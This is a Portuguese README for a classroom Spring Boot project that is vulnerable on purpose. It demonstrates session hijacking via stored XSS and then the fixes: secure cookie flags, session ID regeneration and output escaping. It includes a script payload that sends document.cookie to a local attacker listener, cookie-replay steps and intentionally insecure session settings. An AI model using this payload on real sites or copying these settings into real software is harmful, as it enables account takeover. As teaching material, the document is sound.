# 🕵️ Session Hijacking – JavaSecurityApplication (Spring Boot Security Demo)

**Projeto de demonstração para a disciplina de Segurança em Aplicações (IFB)**  
*Sprint 5 – Session Hijacking: cookies de sessão inseguros, roubo via XSS e contramedidas eficazes.*

---

## 📌 Link para o vídeo no Youtube

- [Assista aqui!](https://www.youtube.com/watch?v=DmQPZFSyyN0)

---

## 📌 Visão Geral

Este projeto implementa uma **aplicação web em Spring Boot** que expõe intencionalmente vulnerabilidades de **gestão de sessão**, para demonstrar ataques de **Session Hijacking**. O cenário mostra como um atacante pode roubar o cookie de sessão de uma vítima via **XSS armazenado** e assumir sua identidade. Em seguida, o código é fortalecido com flags de cookies seguros (`HttpOnly`, `Secure`, `SameSite`) e **regeneração do ID de sessão** no login – conforme recomendações da OWASP.

### Conceitos-chave abordados

- Natureza stateless do HTTP e uso de tokens de sessão (cookies)
- Flags inseguras de cookie (`HttpOnly`, `Secure`, `SameSite` ausentes ou fracas)
- XSS armazenado como vetor para exfiltrar `document.cookie`
- Session Hijacking: reutilização de session ID roubado para assumir identidade da vítima
- Contramedidas: uso das flags corretas no cookie e proteção contra fixação de sessão (`migrateSession()`)
- Alinhamento com **OWASP A07:2021 – Quebras de Autenticação e Identificação**

---

## 🧰 Tecnologias Utilizadas

| Tecnologia          | Versão   | Finalidade                                |
|---------------------|----------|-------------------------------------------|
| Java                | 17       | Runtime                                   |
| Spring Boot         | 3.2.5    | Framework web e de segurança              |
| Spring Security     | 6.2.4    | Autenticação e gestão de sessões          |
| Thymeleaf           | 3.1.2    | Templates server-side HTML                |
| Spring Data JPA     | -        | Persistência de usuários                  |
| H2 Database         | (runtime)| Banco em memória para testes              |
| Maven               | 3.8+     | Build e dependências                      |
| Bootstrap (WebJars) | 5.3.3    | Estilização da interface (opcional)       |

---

## 📁 Estrutura do Projeto

```text
JavaSecurityApplication/
├── pom.xml
├── src/main/java/com/example/session/
│   ├── SessionApplication.java
│   ├── config/
│   │   └── SecurityConfig.java
│   ├── controller/
│   │   ├── AuthController.java
│   │   ├── ProfileController.java
│   │   └── CommentController.java
│   ├── model/
│   │   └── User.java
│   ├── repository/
│   │   └── UserRepository.java
│   └── service/
│       └── CustomUserDetailsService.java
└── src/main/resources/
    ├── application.properties
    └── templates/
        ├── login.html
        ├── register.html
        ├── profile.html
        ├── comments.html
        └── admin.html
```

---

## 🚀 Executando a Aplicação (Versão Vulnerável)

### Pré-requisitos

- Java 17 JDK
- Maven 3.8+
- Python 3 (opcional, para simular servidor do atacante)

### Passos

1. **Clone o repositório**  
   ```bash
   git clone https://github.com/noggyamamoto/JavaSecurityApplication.git
   cd JavaSecurityApplication
   ```

2. **Inicie a aplicação vulnerável:**  
   ```bash
   mvn spring-boot:run
   ```
   A aplicação estará em [http://localhost:8080](http://localhost:8080).

3. **Usuários de teste (criados automaticamente):**
   - Admin: admin / admin123
   - Usuário comum: user / user123

#### Configuração (Vulnerável)

No `application.properties`:

```properties
server.servlet.session.cookie.http-only=false   # JavaScript pode ler o cookie
server.servlet.session.cookie.secure=false      # Cookie enviado via HTTP não seguro
server.servlet.session.cookie.same-site=lax     # Restrição fraca a cross-site
```

Na `SecurityConfig.java`:

```java
.sessionManagement(session -> session.sessionFixation().none())
```

---

## ⚠️ Demonstração Prática – Session Hijacking por XSS

### 1. Sondagem: Flags Inseguras do Cookie

- Faça login como `user` (`user123`).
- DevTools (F12) → Application → Cookies → http://localhost:8080
- Observe:
  - ❌ Ausência do HttpOnly
  - ❌ Ausência do Secure
  - ⚠️ SameSite=Lax

### 2. Injeção de Payload de XSS Armazenado

- Vá para `/comments` (apenas após login).
- Insira este comentário malicioso:

```html
<script>
  fetch('http://localhost:8000/steal?cookie=' + document.cookie);
</script>
```

- O script ficará armazenado e exibido para todos os visitantes da página de comentários.

### 3. Servidor HTTP do Atacante

- Em outro terminal, rode:
  ```bash
  python -m http.server 8000
  ```
- Serve para capturar requisições GET feitas pelo script malicioso.

### 4. Ativação do Script (Vítima Acessa)

- Abra aba anônima, faça login como admin (`admin123`), acesse `/comments`.
- O script executa automaticamente e envia:
  ```
  GET /steal?cookie=JSESSIONID=ABC123...
  ```
- O atacante recebe o cookie de sessão válido da vítima.

### 5. Sequestro da Sessão

- No navegador do atacante, manualmente:
  - DevTools → Application → Cookies
  - Adicione/edite:  
    - Name: `JSESSIONID`
    - Value: valor capturado
    - Domain: `localhost`
  - Recarregue `/profile`. O atacante "vira" o admin, com acesso ao `/admin`.

#### Impacto

O atacante pode visualizar dados privados, agir como a vítima, ou escalar privilégios se a vítima for admin.

---

## 🛡️ Contramedidas Implementadas

### 1. Flags Seguras para Cookies (`application.properties`)

```properties
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true          # requer HTTPS em produção
server.servlet.session.cookie.same-site=strict
```
- **HttpOnly:** impede leitura com JavaScript
- **Secure:** só envia cookie via HTTPS
- **SameSite=Strict:** bloqueia envio em requisições cross-site

### 2. Regeneração do ID de Sessão no Login (`SecurityConfig.java`)

Troque para:

```java
.sessionManagement(session -> session
    .sessionFixation().migrateSession()
);
```
- **migrateSession():** novo ID de sessão após autenticação (impede fixação/fixation de sessão)

### 3. Sanitização de XSS (opcional) – Escape de saída no `comments.html`

De:

```html
<li th:utext="${c}"></li> <!-- vulnerável -->
```

Para:

```html
<li th:text="${c}"></li> <!-- seguro -->
```

---

## ✅ Como Verificar o Fix

- DevTools → Cookies: JSESSIONID mostra HttpOnly ✓ (e Secure se via HTTPS)
- Repita o ataque XSS: script “roda”, mas `document.cookie` não lê o cookie protegido.
- Fixação de sessão: antes do login, force um ID. Após login, o ID muda. Ataque é quebrado.

---

## 🔗 Referências OWASP & Segurança

- [OWASP A07:2021 – Quebras de Autenticação e Identificação](https://owasp.org/Top10/ja/A07_2021-Identification_and_Authentication_Failures/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PortSwigger – Session Hijacking via XSS](https://portswigger.net/web-security/session)
- [RFC 6265 – HTTP State Management Mechanism (Cookies)](https://datatracker.ietf.org/doc/html/rfc6265)

---

## 🧪 Ferramentas Utilizadas

- cURL / Postman (opcional, testes de API)
- Python HTTP server (lado do atacante)
- Chrome DevTools (para inspecionar e editar cookies)
- Burp Suite (alternativa para interceptar/modificar requests)

---

## 📄 Licença

Projeto licenciado sob MIT – uso livre para fins educacionais e de demonstração.

---

## 👥 Autoria

Desenvolvido para:  
*Segurança em Aplicações – IFB (2026/1)*  
Professor: Diógenes Ferreira Reis Fustinoni  
Sprint 5 – Artefato Session Hijacking

---

## 📎 Repositório GitHub

[https://github.com/noggyamamoto/JavaSecurityApplication](https://github.com/noggyamamoto/JavaSecurityApplication)
